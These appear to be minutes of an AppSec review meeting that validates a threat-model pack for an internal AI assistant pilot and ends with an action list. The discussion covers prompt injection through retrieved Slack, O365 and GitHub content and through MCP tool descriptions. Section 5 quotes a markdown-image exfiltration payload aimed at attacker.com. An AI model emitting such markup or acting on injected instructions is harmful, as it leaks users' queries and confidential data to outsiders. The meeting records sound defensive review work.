# Validation Session — Internal AI Assistant Pilot Security Pack

**Date:** 2026-09-09
**Time:** 14:05 – 15:07
**Duration:** 62 minutes
**Facilitator:** Brett Crawley, Principal Application Security Engineer

**Attendees**

| Name | Role |
|---|---|
| Brett Crawley | Principal AppSec Engineer (facilitator) |
| Dana Whitfield | Epic owner, Product |
| Marcus Oyelaran | Lead architect |
| Priya Raghunathan | Senior engineer, built the pilot |
| Tom Egerton | Engineering manager, Support |
| Ines Ferreira | Data Protection Officer |
| Kwame Osei | Security Champion, Platform |

**Material reviewed:** the eight-document security analysis package for PLAT-2810, dated 2026-09-09 — `README.md`, `00-context-sources-and-open-questions.md`, `01-security-review.md`, `02-use-abuse-and-security-privacy-use-cases.md`, `03-security-architecture.md`, `04-gap-analysis.md`, `05-srtm-and-test-artefacts.md`, `06-threat-model.md`.

---

## 1. Opening and shape of the pack

**Brett:** Everyone's had the pack since Friday. I want to be clear what this session is for. We are not here to admire it. We are here to say, finding by finding, whether it is true, whether it matters, and who owns it. If something in here is wrong, say so and I'll record it.

**Marcus:** It's the most complete thing anyone's produced on this system.

**Brett:** It is. Let's start with the shape. Priya, you counted the register?

**Priya:** The risk register in document 06 has twelve rows. S-1 to S-12.

**Brett:** The README says — *(reads)* — "20 total findings (11 STRIDE + 8 LINDDUN + 1 multi-category)".

**Priya:** There aren't twenty. There are twelve. And the README's critical list says "ST-002, ST-003, ST-004 + PT-007". None of those IDs exist in the threat model. It uses S-numbers.

**Kwame:** Document 02 uses ST- as well. SAC-001 says "Linked Threat: ST-001 (Prompt Injection)".

**Priya:** And SAC-002 says "Linked Threat: ST-002 (MCP Tool Description Injection)", where the README says ST-002 is over-provisioned access. Same ID, two different things.

**Marcus:** So the identifiers don't join up.

**Brett:** Right. Anything else in that category before I park it?

**Ines:** Section 5c of the threat model puts the cluster in us-west-1. Section 1 of the same document says EU-west-1, and the architecture document says EU-west-1 per `iam.tf`.

**Priya:** eu-west-1. The secrets ARN in the terraform is eu-west-1.

**Brett:** Fine. So we have an ID scheme that changed mid-pack, a headline count that doesn't match its own register, and a region typo. That's a renumbering pass, not a content problem. I'll take that as an editorial action on me and we'll go through the findings on their merits. Agreed?

**Marcus:** Agreed.

**Dana:** Agreed.

---

## 2. S-1 — shared app registration, and what the architecture page says

**Brett:** S-1. Critical. "Shared App Registration Allows Over-Provisioned Access." Marcus, is that true?

**Marcus:** It overstates it. The assistant acts as the requesting user — it calls the connectors on behalf of whoever asked, so a user only reaches what they could reach themselves.

**Kwame:** That's my understanding too. It's the user's session that drives it.

**Dana:** That's what I've been telling the pilot group when they ask.

**Priya:** No. That isn't what it does.

**Brett:** Go on.

**Priya:** There is one app registration. Every connector call goes out under it, whoever asked. The pack has it right. ADR-0002 is the decision to do that — I wrote it — and document 03's access control matrix has it in a table: pilot user reading from GitHub, current state, "Via shared app (over-provisioned)".

**Marcus:** *(pause)*

**Marcus:** Where does it say a user can get something they couldn't open?

**Priya:** S-1, in the example. And ADR-0002 is quoted in document 01 — "A user can obtain content through the assistant that they could not open directly."

**Marcus:** That's my ADR quote coming back at me.

**Priya:** It's your ADR. It's been there since March.

**Ines:** Can I ask why three people in this room believed the opposite?

**Marcus:** Because the architecture page says it. Mine. *(reads from 03)* — "Users authenticate via delegated OAuth per connector (planned PLAT-2820); currently using shared app registration for expedited pilot." The review put the qualifier in. The Confluence page doesn't. It's one sentence in the present tense and it's been the page everyone reads since February.

**Brett:** Dana, you've been repeating it to the pilot group.

**Dana:** From the page. I've never opened the ADRs.

**Kwame:** Nor me.

**Tom:** Support was told the same thing at onboarding. That the assistant only sees what the agent sees.

**Ines:** So we had a document that said the true thing and a document that said the comfortable thing, and we all read the comfortable one.

**Marcus:** Yes.

**Brett:** Recorded. Marcus owns correcting the architecture page. Now — one thing in the gap analysis I want your view on. GAP-A1 lists as an impact: "Violates ADR-0002 design (intended design has per-user delegation)."

**Priya:** That's backwards. ADR-0002 *is* the shared app registration. The current state doesn't violate it, it implements it. What it diverges from is Marcus's page.

**Marcus:** She's right. The ADR is the decision to accept it for the pilot.

**Brett:** So that impact line comes out. The gap stands; the reason given for it is wrong. Priya, you'll write the replacement wording.

---

## 3. S-3, ADR-0004 — who decided internal content is safe?

**Brett:** S-3, prompt injection via retrieved document. High. Mitigation says, quote, "Only web search is sanitised (ADR-0004); internal sources (GitHub, O365) are trusted not to have injections." Document 01 puts it more plainly — "Internal sources trusted: O365, Slack, GitHub are behind corporate authentication; their outputs are not sanitised, trusting that corporate access controls are sufficient."

**Marcus:** That's accurate. It's the trust model.

**Brett:** Who decided it?

**Marcus:** It's in the trust model because it was assessed.

**Brett:** By whom?

**Marcus:** *(pause)* It came from the epic. It was settled before I wrote the trust boundary section — I was writing down a position, not taking one.

**Brett:** Dana. It's your epic.

**Dana:** PLAT-2814. The acceptance criterion says internal sources "don't need the same handling". That was a scoping note. I was saying we're not building four sanitisers in phase one, we're building one, for the connector that's obviously outside.

**Brett:** A scoping note.

**Dana:** A scoping note. I'm not a security engineer. I wasn't ruling on whether internal content is safe, I was ruling on what fits in the phase.

**Priya:** I implemented to the criterion. ADR-0004 says we clean only web search "because that is the connector PLAT-2814 identified as untrusted". I assumed the criterion reflected a position someone had taken.

**Kwame:** I assumed the platform sanitiser covered it. There's one in the standard ingress path.

**Priya:** It's not in this path. Nothing sits between a connector result and the prompt.

**Brett:** So: Dana wrote a scoping note. Priya implemented it as a security position. Marcus wrote the security position into the trust model on the basis it had been assessed. Kwame assumed the platform covered it. Is there anybody who actually decided that internal content is safe to put in a prompt unsanitised?

*(pause)*

**Marcus:** No.

**Dana:** No.

**Brett:** I'm not going to resolve it here and I don't want anyone to volunteer an answer in the room. The decision was never made. It got inherited three times and each artefact cites the next one along. The action is that somebody now makes it, in writing, and it is not made in this meeting.

**Ines:** Before you move on — "internal" is doing a lot of work in that sentence. Whose content is in the internal sources?

**Tom:** That's what I was going to say. Slack isn't internal.

**Brett:** Say more.

**Tom:** We have three Slack Connect channels shared with customers. Two enterprise accounts raise things through them — that's their day-to-day route to us now, not the ticket portal.

**Marcus:** Connect channels are in the workspace.

**Tom:** They're in the workspace. The messages in them are written by customers.

**Priya:** And the Slack connector is installed with full scope. If search returns channel messages, it returns those.

**Brett:** Does it?

**Priya:** I'd have to check. I've never looked at whether Connect channels come back through the search tool.

**Brett:** Then that's an open question, not a finding, and it's the first thing Priya checks. Tom, list the channels and the accounts. What I want on the record is that the pack's trust boundary — corporate network inside, everything else outside — has customer-authored text sitting on the inside of it, and no document in this pack knows that.

**Ines:** And if it's reachable, we are putting customer content through the model provider on a lawful basis nobody has written down.

**Brett:** Recorded.

---

## 4. The write path and the commit tool

**Brett:** Staying with S-3. GAP-D1, output filtering for tool arguments, is listed as blocking GA. What's the actual exposure? Priya, what can the model call?

**Priya:** Four write tools. `send_email`, `post_message`, `create_issue`, `commit_code`.

**Brett:** `commit_code` is the one that worries me. If an injected instruction reaches it, what happens?

**Marcus:** It can't do much. Branch protection. Nothing lands without review.

**Kwame:** That's in the standing platform controls — "Branch protection and signed commits on protected branches". The threat model lists it as an existing control, section 3, with a tick.

**Brett:** Does it apply to this repo, or is that an assumption?

**Priya:** It applies. Document 00 checked it — *(reads)* — "`.github/branch-protection-exemptions.yml` — Lists exemptions; assistant repo not listed, so branch protection applies." That's right. The exemption list is a config file in the org repo, and we're not on it.

**Brett:** Good. That's one control in this pack that somebody actually verified rather than assumed. How often has the commit tool run?

**Priya:** Eleven times since July. Nine of those were me testing it.

**Brett:** Two real uses in two months.

**Priya:** Two.

**Dana:** It's not what the pilot group uses it for. They use it to post and to draft mail. The write volume is Slack and email, by a distance.

**Brett:** Then here's what I'd propose. GAP-D1 stays blocking, but the first implementation of argument validation covers `post_message` and `send_email`, which is where the volume and the exposure are, and `commit_code` follows in phase two on the basis that branch protection and review bound it. Objections?

**Marcus:** None. That's proportionate.

**Kwame:** Agreed.

**Priya:** I'll take it.

**Brett:** Priya owns SUC-001 scoped that way. Dana, while we're here — ADR-0003, no pre-action confirmation. The threat model says the pilot group explicitly requested it. Yours?

**Dana:** Mine, and I'd make the same call again. We measured it. Confirming every action makes the assistant slower than doing the thing by hand, and then nobody uses it and we've spent two quarters proving nothing. The mitigation is that the action is visible in the conversation, immediately, and a human is sitting there.

**Brett:** And for unattended operation?

**Dana:** Unattended is phase three. I'd expect to be told no, and I wouldn't argue.

**Brett:** Recorded as confirmed and defended, not as an oversight.

---

## 5. S-9 — markdown images

**Brett:** S-9. Medium. Web search sanitiser doesn't strip image URLs. The example is — *(reads)* — "Web search result includes markdown: `![image](https://attacker.com/log?user=alice&query=summarise-confidential)`. Sanitiser does not strip URL."

**Kwame:** That one's covered. Egress proxy, domain allowlist. `attacker.com` isn't on it, so the fetch never leaves.

**Marcus:** Agreed, that's a platform control. It's listed in the architecture doc — outbound traffic through the egress proxy with a domain allowlist.

**Brett:** Priya?

**Priya:** Read the next line of the example.

**Brett:** *(reads)* — "Slack/web console renders markdown. Attacker's server receives request with user and query logged."

**Priya:** The fetch isn't ours. Nothing in the cluster requests that image. The markdown goes to Slack or to the console, and the browser on someone's laptop makes the request.

**Kwame:** *(pause)*

**Kwame:** Then it's not on our egress path at all.

**Priya:** No. The proxy sits on server-side egress. That request originates in the client.

**Marcus:** So the allowlist never sees it.

**Priya:** The allowlist never sees it.

**Kwame:** Then I was wrong, and so is the assumption in document 00 that platform controls cover this. It's an outbound channel that doesn't touch the platform.

**Brett:** Note what just happened — the document got there and we didn't. The pack has the right answer written down and two of us argued with it for three minutes. S-9 stands as written. Does the severity stand? It's rated Medium.

**Ines:** The query text goes with it. And the user identifier, in the example. That's personal data leaving to an arbitrary endpoint.

**Brett:** Then it stays Medium in the register but the URL stripping goes in with the sanitiser work, not after it. Priya.

**Priya:** Fine.

---

## 6. S-5, GAP-D5, GAP-O4 — connectors and supply chain

**Brett:** S-5. MCP server compromise or silent update. Unmitigated. GAP-D5 is the same thing — no tool description pinning.

**Marcus:** The vendor servers are Microsoft, Slack and GitHub. I'm relaxed about those.

**Priya:** Web search isn't. Document 03 lists it as "Web Search (Community)".

**Brett:** How are they versioned?

**Priya:** They aren't. Every connector is pinned to `latest`. All four, including the community web-search server.

**Kwame:** All of them?

**Priya:** All of them. If any one of those publishes tomorrow, we take it on the next pod restart.

**Brett:** The pack says pinning is required. It doesn't say you're on `latest` — it couldn't know that. That's the difference between "you should pin" and "nothing is pinned". Write it down as the second one.

**Ines:** Is that also the dependency scanning question?

**Brett:** GAP-O4. The gap analysis says — "unclear if scanning is actually enabled for Node dependencies". The threat model, section 3, lists as an existing organisational control: "Dependency scanning enabled; critical findings block build", with a tick.

**Kwame:** Both of those are in the same pack.

**Priya:** They're both from platform controls, and the answer's already in document 03. ADR-0001's implication says it — "Shared CI templates don't cover Node dependencies." That's correct. The scanning that exists is for the Go estate. Node isn't scanned. PLAT-2077 is the ticket to fix it and it's open.

**Brett:** So the pack hedged in one document, ticked it in another, and answered it in a third. The answer is: not scanned. That's now a fact rather than a question, and it took Priya eleven seconds. Nothing in the documents could close it, because two of them disagreed and neither was allowed to say which was right.

**Kwame:** I'd rather the tick came out of section 3.

**Brett:** It comes out.

---

## 7. S-6, GAP-A3, GAP-A4 — Redis and network policy

**Brett:** S-6, Redis tampering. GAP-A3, transit encryption disabled, listed as blocking. GAP-A4, network policy disabled on the beta cluster, listed as non-blocking. Priya, the terraform comment in document 03 —

**Priya:** *(reads)* — "Transit encryption adds a TLS handshake per command and the client library in the pilot did not support it cleanly. Cluster internal only." That's my comment. It's still true. The client we're on doesn't do TLS without a rewrite of the connection handling.

**Brett:** So GAP-A3 as written — update the client library — is real work.

**Priya:** Real work. Not a config flag.

**Kwame:** The alternative is on the platform side anyway. Default-deny network policy is the standard. It's disabled on beta because beta doesn't have the feature enabled, not because we turned it off. The GA cluster has it.

**Marcus:** And the architecture document offers it as an either/or. Section 5 — "either enable transit encryption (after updating client library) or enforce network policy + in-cluster-only access."

**Brett:** Priya, is there a test for this?

**Priya:** TA-203 in the test document. Redis brute force. The expected outcome says — *(reads)* — "no transit encryption is mitigated by in-cluster-only access (network policy enforces this)."

**Brett:** And?

**Priya:** Network policy doesn't enforce anything. It's off. The test asserts as its expected outcome the control that GAP-A4 says doesn't exist, four documents earlier in the same pack. If someone runs that test on beta it passes on paper and fails in reality.

**Brett:** Corrected. The expected outcome for TA-203 is rewritten to state that on the beta cluster there is no isolation and the test is expected to succeed. Now the disposition on the gaps themselves. We have an either/or, one side is a client rewrite we own, the other side is a platform feature that arrives with the GA cluster.

**Marcus:** Then the platform side closes it. We shouldn't rewrite the Redis client to solve a problem that the GA cluster solves by existing.

**Kwame:** I'd agree. PLAT-2101 is the ticket, it's the platform standard, and no service should be shipping its own answer to network segmentation.

**Dana:** And if it's a rewrite it competes with PLAT-2820, which I'd rather have.

**Brett:** Any objection to downgrading GAP-A3 from blocking, on the basis that PLAT-2101 covers it on the GA cluster?

*(pause)*

**Priya:** No objection. It's the same outcome for less work.

**Brett:** Then GAP-A3 comes off the blocking list and Kwame confirms PLAT-2101 lands with the GA cluster. GAP-A4 stays as it is.

---

## 8. S-7 and the logging recommendation

**Brett:** S-7, no audit trail of tool arguments. High. Tool arguments and results at debug level only, off in production.

**Priya:** True as written.

**Brett:** Document 01 has a recommendation I want to test. Privacy by design table, principle six. Current state, "Audit logs exist but do not log tool args/results in production". Gap column — "Enable debug logging in production for audit trail".

**Ines:** No.

**Brett:** Go on.

**Ines:** What's in a tool argument?

**Priya:** Whatever the user asked plus whatever came back. Document 03 classifies it — arguments and results, "Internal + Confidential", high sensitivity.

**Ines:** So the pack's fix for the audit gap is to write confidential content and personal data into a log store with a ninety-day hot retention, to solve a problem it describes three pages earlier as a volume problem. And its own counter-use case says the opposite — SUC-005 says "Do not log Redis payloads (they contain user queries and retrieved sensitive data)."

**Marcus:** Those two can't both be the recommendation.

**Ines:** They can't. And PRV-003 in the requirements says telemetry does not include sensitive data. Turning debug logging on in production breaks a requirement the same pack raises.

**Brett:** Then that row is wrong and it doesn't go forward. The version that survives is S-7's own mitigation — selective argument logging for the security-sensitive tools, redacted values. That's what gets implemented; the PbD row is struck.

**Ines:** Agreed.

---

## 9. S-10, S-11 — telemetry and the privacy notice

**Ines:** I have a question on the warehouse. The dashboard I've been shown aggregates to team. Is the underlying data per user?

**Priya:** Yes.

**Ines:** Queryable per user?

**Priya:** Queryable per user. It's a row per turn with the user's email on it.

**Ines:** Then the aggregation is a presentation choice, not a control.

**Brett:** Which is what the pack says. S-10 — "Analytics warehouse stores usage telemetry per user for 13 months. Analyst can correlate conversations and reconstruct user's information-seeking behavior." And the schema is printed in document 03: `"user_id": "email"`, thirteen months.

**Ines:** Then I withdraw the question. It's already in front of me.

**Brett:** I want that on the record properly, because it's not nothing. Ines asked the right question and the document had already answered it with evidence. We confirm S-10 and add nothing.

**Ines:** S-11 as well, then. Unawareness, no privacy notice. Unmitigated, High. That's correct and it's mine to fix, and I'd note the pack's own example lists the four things users don't know and all four are true.

**Brett:** Confirmed, no change.

---

## 10. UC-003 and the Support mailbox

**Brett:** Tom, document 02, use case 3. Support agent summarises customer history.

**Tom:** That one's got it wrong. The pack has Support's shared mailbox down as out of scope for the pilot. It isn't — we've been reading it since June, it's the main thing we wanted the assistant for.

**Ines:** That isn't what it says.

**Tom:** GAP-O6, "before Phase 2 expansion".

**Ines:** What's deferred to phase two is the legal clearance, not the reading. The use case has the assistant searching the shared mailbox in the main flow, step two. The precondition says — *(reads)* — "Shared mailbox is readable by the agent (raises GDPR question about mailbox data processing)". It's in scope in the document and the document flags it.

**Tom:** Then I've conflated two things. Fine. But it's still the point — it's a shared mailbox, not individual inboxes, and that's the whole reason Support asked for this.

**Brett:** Does the pack know it's shared?

**Priya:** It does. It says shared in the use case, in the open questions, and GAP-O6 is titled "Shared Mailbox Data Processing Not Cleared".

**Brett:** Then Tom's correction doesn't stand, and the underlying fact is already in the document. Ines, the legal question.

**Ines:** Is unanswered. And it's the one place in this pack where "before Phase 2" is the wrong answer, because the processing is happening now. I'd want the lawful basis for the mailbox settled before the pilot renews, not before it expands.

**Dana:** The pilot renews in October.

**Ines:** Then October.

**Brett:** Recorded, and the date moves.

---

## 11. COMP-008 — NIS2

**Brett:** COMP-008. NIS2, not assessed. The assessment says it "only applicable if organisation is 'essential' or 'important' entity under NIS2". Ines, can you close that?

**Ines:** Partly. We are not a NIS2 entity. We're not in any of the listed sectors and we don't meet the thresholds.

**Kwame:** So it's out.

**Ines:** No. Two of our customers are NIS2 entities and their contracts flow the obligations down to us. Supply chain security, incident notification timelines, the risk-management measures. We carry them contractually whether or not the regulation names us.

**Marcus:** That's not what the pack asked.

**Ines:** The pack asked whether we're an entity. That's the only question it knew to ask. The question that matters is what we signed.

**Brett:** And are those obligations engaged by this system?

**Ines:** If customer content is going through it, yes. Which is the Connect channel question from earlier.

**Brett:** Then COMP-008 doesn't close as "requires organisational assessment". It reopens with a different question. Ines owns extracting the obligations from the two contracts.

**Ines:** One more thing, since the pack keeps saying it. We're SOC 2 Type II. We are not ISO 27001 certified. I've seen the ISO claim in two decks this quarter and it isn't true, and it matters for what we can tell those customers about the control environment.

**Brett:** Noted, and out of scope for this pack, but it's going in the actions.

---

## 12. GAP-A2 / ADR-0006 — the fallback nobody owns

**Brett:** S-8. Critical. Provider fallback to the public endpoint outside the DPA. The gap analysis owner field says, literally, "Unassigned (ADR says 'nobody owns chasing it')".

**Ines:** This is the one I care most about. Confidential content going to an endpoint we have no processing agreement with, at peak load, which is when the most content is moving.

**Priya:** It's a 429 handler. Enterprise endpoint returns 429, we retry against the public one rather than fail the turn.

**Brett:** How often does it fire?

**Priya:** I don't have that number. We don't log which endpoint served a turn.

**Brett:** Then we're accepting an unquantified DPA breach.

**Marcus:** The fix is the quota increase. It's been pending since the ADR.

**Brett:** Pending with whom?

*(pause)*

**Dana:** With nobody. That's the honest answer. It's a procurement conversation and it's never had a name against it.

**Brett:** Do you want it?

**Dana:** I'll take it. I own the epic, I have the vendor manager relationship, and I'd rather chase the quota than explain the breach.

**Ines:** And in the meantime?

**Dana:** In the meantime I'd rather it failed the turn than sent the prompt. Users can retry.

**Priya:** That's a small change. An hour.

**Brett:** Then do both. Priya makes it fail closed on 429 this sprint, Dana chases the quota, and GAP-A2 gets an owner for the first time since April.

---

## 13. GAP-O5 — debug routes

**Brett:** GAP-O5. `EXPOSE_DEBUG_ROUTES` — the Helm comment is "intentionally unset; the runbook uses the debug routes". What do the debug routes expose?

**Priya:** I don't know. They predate me on this service.

**Brett:** Kwame?

**Kwame:** Not documented anywhere I can see.

**Brett:** Marcus?

**Marcus:** No.

*(pause)*

**Brett:** So we have an undocumented endpoint set that the runbook depends on, in a service that holds conversation state, and nobody in this room can say what it returns. That's the most honest finding in the pack and it stays exactly as written. Priya, enumerate them and come back.

---

## 14. Document 05 — requirements and tests

**Brett:** Last section. The SRTM and the test artefacts. Anyone got a problem with it?

**Kwame:** It's the strongest document in the pack. Every requirement has a control and a test ID against it — I went down the whole matrix, there isn't a blank cell.

**Marcus:** That's more traceability than anything else we ship.

**Priya:** The requirement IDs are used twice, though. COMP-005 in the gap analysis is "GDPR — No Incident Response Plan", and GAP-A2 says it's required by "COMP-005 (DPA Compliance)".

**Brett:** Same collision as the ST-numbers this morning.

**Priya:** Same collision.

**Brett:** Then it's the same action — one renumbering pass across the pack. Content stands. Dana, does the test set look like something QA can pick up?

**Dana:** It looks like a plan. Attack tests, privacy tests, pen test scenarios, automation split.

**Brett:** Then we take document 05 as the basis for the GA test plan and QA schedules it. Priya, you'll want to review the coverage before they start.

**Priya:** After the sanitiser work.

**Brett:** After the sanitiser work.

---

## 15. Close

**Brett:** We're at the hour. I'll be honest, I expected this to take two sessions and it took one, and I don't think that's because we rushed it — the pack answered most of what I'd have had to ask. Two things I want on the record before the actions. One, the biggest thing we found today isn't in the pack and couldn't be: three Slack Connect channels with customer text in them, sitting inside a trust boundary that the whole analysis rests on. Two, nobody in this organisation ever decided that internal content is safe to put in a prompt, and four people each thought someone else had.

**Ines:** And that a document had to tell us how our own authorisation works.

**Brett:** And that. Actions.

---

## Action list

| # | Action | Owner | Due |
|---|---|---|---|
| 1 | Make and record the decision on sanitising internal content. Written trust position covering O365, Slack and GitHub retrieval, independent of PLAT-2814's acceptance criterion. Not to be settled by referring back to ADR-0004 or the architecture page. | Marcus Oyelaran | 2026-09-23 |
| 2 | List the three Slack Connect channels and the two enterprise accounts; confirm whether Connect channel content is returned by the Slack connector's search tool. | Tom Egerton (list), Priya Raghunathan (reachability) | 2026-09-16 |
| 3 | Correct the architecture page: the delegated-OAuth sentence to be rewritten so it does not state per-user delegation in the present tense. Notify the pilot group of the correction. | Marcus Oyelaran | 2026-09-12 |
| 4 | Rewrite GAP-A1's impact line. The current state implements ADR-0002; it diverges from the architecture page, not from the ADR. | Priya Raghunathan | 2026-09-16 |
| 5 | Implement SUC-001 argument validation for `post_message` and `send_email` for GA. `commit_code` deferred to Phase 2 on the basis that branch protection and review bound its blast radius. | Priya Raghunathan | Before GA |
| 6 | Extend the web-search sanitiser to strip external image URLs, in the same change as SUC-001 rather than after it. | Priya Raghunathan | Before GA |
| 7 | Pin every connector to an explicit version and record the versions. Remove `latest` from all four, including the community web-search server. | Priya Raghunathan | 2026-09-23 |
| 8 | Remove the "Dependency scanning enabled" tick from the threat model's organisational controls; Node dependencies are not covered by the shared CI templates. Progress PLAT-2077. | Kwame Osei | 2026-09-30 |
| 9 | GAP-A3 (Redis transit encryption) downgraded from blocking to covered by PLAT-2101 on the GA cluster. Confirm PLAT-2101 ships with the GA cluster and report back. | Kwame Osei | 2026-09-30 |
| 10 | Rewrite TA-203's expected outcome: on the beta cluster there is no network policy and the read is expected to succeed. | Priya Raghunathan | 2026-09-16 |
| 11 | Strike the "enable debug logging in production" recommendation from the PbD table. Implement S-7's selective argument logging for security-sensitive tools with redacted values instead. | Priya Raghunathan | Before GA |
| 12 | Fail closed on provider 429 rather than falling back to the public endpoint. | Priya Raghunathan | This sprint |
| 13 | Chase the enterprise quota increase with the vendor manager. GAP-A2 owner assigned. | Dana Whitfield | 2026-09-30 |
| 14 | Settle the lawful basis for Support's shared mailbox before the pilot renews, not before Phase 2 expansion. | Ines Ferreira | 2026-10-31 |
| 15 | Reopen COMP-008. Extract the NIS2 obligations flowed down by the two customer contracts and map them onto the GA gate. | Ines Ferreira | 2026-09-30 |
| 16 | Correct the certification claim in circulating material: SOC 2 Type II, not ISO 27001. | Ines Ferreira | 2026-09-16 |
| 17 | Enumerate the debug routes and what they expose; document them or remove the runbook's dependency on them. | Priya Raghunathan | 2026-09-30 |
| 18 | Editorial pass across the pack: renumber ST-/PT- references to the S- scheme, resolve the duplicate COMP- identifiers, correct us-west-1 to eu-west-1. Content accepted as reviewed. | Brett Crawley | 2026-09-16 |
| 19 | Document 05 accepted as the basis for the GA test plan. QA to schedule TA-001 to TA-032; Priya to review coverage after the sanitiser work lands. | Dana Whitfield (QA scheduling), Priya Raghunathan (review) | Before GA |
| 20 | Privacy notice (PUC-001) drafted and published; S-11 confirmed as unmitigated until it is. | Ines Ferreira | Before GA |

**Session closed 15:07.**
